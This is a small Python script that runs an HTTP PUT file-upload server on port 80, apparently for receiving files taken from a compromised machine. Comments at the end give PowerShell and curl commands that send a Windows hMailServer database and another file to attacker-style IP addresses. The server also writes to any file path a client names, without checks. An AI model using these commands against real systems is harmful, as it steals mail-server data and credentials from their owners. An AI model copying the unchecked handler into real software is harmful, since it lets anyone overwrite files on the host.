#!/usr/bin/env python3
from http.server import HTTPServer, BaseHTTPRequestHandler
import urllib.parse

class PutHandler(BaseHTTPRequestHandler):
    def do_PUT(self):
        content_length = int(self.headers['Content-Length'])
        data = self.rfile.read(content_length)
        
        # Extract filename from path (remove leading slash)
        filename = urllib.parse.unquote(self.path[1:])
        if not filename:
            filename = "uploaded_file"
            
        with open(filename, 'wb') as f:
            f.write(data)
            
        self.send_response(200)
        self.end_headers()
        print(f"Received file: {filename} ({content_length} bytes)")
        
    def log_message(self, format, *args):
        # Optional: Clean up console output
        print(f"{self.address_string()} - {format % args}")

if __name__ == '__main__':
    server = HTTPServer(('0.0.0.0', 80), PutHandler)
    print("Upload server running on port 80 (PUT method enabled)")
    print("Waiting for uploads...")
    server.serve_forever()
# powershell -c "Invoke-WebRequest -Uri http://10.10.15.169/hMailServer.sdf -Method PUT -InFile 'C:\ProgramData\hMailServer.sdf'"
# curl -X PUT -T "hMailServer.sdf" http://192.168.1.100/hMailServer.sdf
# Invoke-WebRequest -Uri "http://10.10.14.226/C8D69EBE9A43E9DEBF6B5FBD48B521B9" -Method Put -InFile "C8D69EBE9A43E9DEBF6B5FBD48B521B9"
